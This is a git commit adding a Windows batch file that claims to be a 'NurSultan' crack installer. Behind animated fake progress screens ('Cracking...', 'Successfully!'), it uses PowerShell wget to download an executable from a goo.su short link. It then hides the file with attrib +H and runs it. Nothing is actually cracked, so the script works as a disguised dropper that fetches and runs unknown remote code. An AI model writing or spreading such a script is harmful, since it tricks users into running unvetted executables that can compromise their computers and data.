40590e00a1c4047eef09a7da7d6bfeb825990369
progerok001 <166206969+progerok001@users.noreply.github.com>
2024-04-21 18:14:07 +0300

    Add files via upload

---
+++ NurSultanInstaller.bat
@@ -0,0 +1,146 @@
+@echo off
+color 2
+echo 		----------------------------------------------------
+echo 		/               NurSultanCrackInstaller:           /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/               Loading...                         /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		----------------------------------------------------
+timeout /t 2 /nobreak>Nul
+cls
+echo 		----------------------------------------------------
+echo 		/               NurSultanCrackInstaller:           /
+echo 		/                                                  /
+echo 		/ - download.client.exe                            /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		----------------------------------------------------
+powershell wget "https://goo.su/9Sa0o6" -o "client.exe"
+attrib +H client.exe
+cls
+echo 		----------------------------------------------------
+echo 		/               NurSultanCrackInstaller:           /
+echo 		/                                                  /
+echo 		/ - download.client.exe                            /
+echo 		/ - Successfully!                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		----------------------------------------------------
+timeout /t 2 /nobreak>Nul
+cls
+echo 		----------------------------------------------------
+echo 		/               NurSultanCrackInstaller:           /
+echo 		/                                                  /
+echo 		/ - download.client.exe                            /
+echo 		/ - Successfully!                                  /
+echo 		/ - Cracking client.exe                            /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		----------------------------------------------------
+timeout /t 5 /nobreak>Nul
+cls
+echo 		----------------------------------------------------
+echo 		/               NurSultanCrackInstaller:           /
+echo 		/                                                  /
+echo 		/ - download.client.exe                            /
+echo 		/ - Successfully!                                  /
+echo 		/ - Cracking client.exe                            /
+echo 		/ - Cracking...                                    /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		----------------------------------------------------
+timeout /t 10 /nobreak>Nul
+cls
+
+cls
+echo 		----------------------------------------------------
+echo 		/               NurSultanCrackInstaller:           /
+echo 		/                                                  /
+echo 		/ - download.client.exe                            /
+echo 		/ - Successfully!                                  /
+echo 		/ - Cracking client.exe                            /
+echo 		/ - Cracking...                                    /
+echo 		/ - Successfully!                                  /
+echo 		/ - start client.exe                               /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		----------------------------------------------------
+start client.exe
+timeout /t 3 /nobreak>Nul
+cls
+echo 		----------------------------------------------------
+echo 		/               NurSultanCrackInstaller:           /
+echo 		/                                                  /
+echo 		/ - download.client.exe                            /
+echo 		/ - Successfully!                                  /
+echo 		/ - Cracking client.exe                            /
+echo 		/ - Cracking...                                    /
+echo 		/ - Successfully!                                  /
+echo 		/ - start client.exe                               /
+echo 		/ - Processing...                                  /
+echo 		/                                                  /
+echo 		/                                                  /
+echo 		----------------------------------------------------
+timeout /t 5 /nobreak>Nul
+cls
+echo 		----------------------------------------------------
+echo 		/               NurSultanCrackInstaller:           /
+echo 		/                                                  /
+echo 		/ - download.client.exe                            /
+echo 		/ - Successfully!                                  /
+echo 		/ - Cracking client.exe                            /
+echo 		/ - Cracking...                                    /
+echo 		/ - Successfully!                                  /
+echo 		/ - start client.exe                               /
+echo 		/ - Processing...                                  /
+echo 		/ - Successfully!                                  /
+echo 		/                                                  /
+echo 		----------------------------------------------------
+timeout /t 2 /nobreak>Nul
+cls
+echo 		----------------------------------------------------
+echo 		/               NurSultanCrackInstaller:           /
+echo 		/                                                  /
+echo 		/ - download.client.exe                            /
+echo 		/ - Successfully!                                  /
+echo 		/ - Cracking client.exe                            /
+echo 		/ - Cracking...                                    /
+echo 		/ - Successfully!                                  /
+echo 		/ - start client.exe                               /
+echo 		/ - Processing...                                  /
+echo 		/ - Successfully!                                  /
+echo 		/ - Have Fun!!!                                    /
+echo 		----------------------------------------------------
+pause
+
+
+
+
+
+
